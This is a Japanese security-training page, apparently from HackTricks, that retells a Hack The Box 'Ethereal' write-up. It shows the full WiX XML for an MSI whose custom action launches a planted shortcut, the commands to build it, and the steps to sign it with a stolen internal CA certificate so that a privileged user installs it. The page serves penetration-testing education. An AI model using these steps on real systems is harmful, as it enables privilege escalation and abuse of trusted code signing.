# WiX を使用した Custom-Action MSI の作成

{{#include ../../banners/hacktricks-training.md}}

この Hack The Box の過去のチェーンでは、WiX Toolset v3 を使用して、あらかじめ配置された `.lnk` ファイルを起動する MSI を構築していました。**MSI は自動的に特権を持つわけではありません**。実行は、Windows Installer のポリシー、custom-action の属性、およびインストールを実行するユーザーによって選択されたコンテキストで行われます。引用されているシナリオでは、攻撃者は信頼された署名 CA も盗み、別のユーザーが監視しているフォルダーに署名済み MSI を配置していました。<sup>[[1]](#references)[[3]](#references)</sup>

wix MSI の使用例を包括的に理解するには、[このページ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)を参照することを推奨します。ここでは、wix MSI の使用方法を示すさまざまな例を確認できます。<sup>[[2]](#references)</sup>

この MSI は `C:\Users\Public\Desktop\Shortcuts\rick.lnk` を実行します。元の WiX v3 XML は以下に保存されています。<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` は最小 Windows Installer バージョンを宣言し、`Compressed="yes"` はパッケージが圧縮されていることを示します。`Stage1` は deferred ですが、`Impersonate="yes"` が設定されているため、インストールを実行するユーザーの偽装トークンで実行されます。このシナリオで権限が変わったのは、後から MSI を開いた privileged user によるものであり、この属性が魔法のように SYSTEM 権限を付与したわけではありません。<sup>[[3]](#references)</sup>

`candle.exe` を使用してソースを WiX オブジェクトにコンパイルします。<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
そのオブジェクトを `light.exe` で MSI にリンクします：<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### 元の chain で使用された署名手順

対象の workflow は、侵害された内部 CA によって署名された package を受け入れていました。write-up では、復元された `MyCA.cer`/`MyCA.pvk` から signing certificate を導出し、PFX を作成して MSI に署名しました:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
攻撃者はその後、署名済みパッケージを `D:\DEV\MSIs` に配置し、privileged workflow/user が実行するのを待ちました。この technique を適用する際は、その前提条件を維持してください。elevated installation path、`AlwaysInstallElevated` のような安全でない policy、または privileged victim がなければ、このパッケージは現在の user の権限でのみ実行されます。

## References

- [1] [Hack The Box - Ethereal: 悪意のある msi の作成と root の取得 - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [簡単な入門: WiX で MSI installer を作成する - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
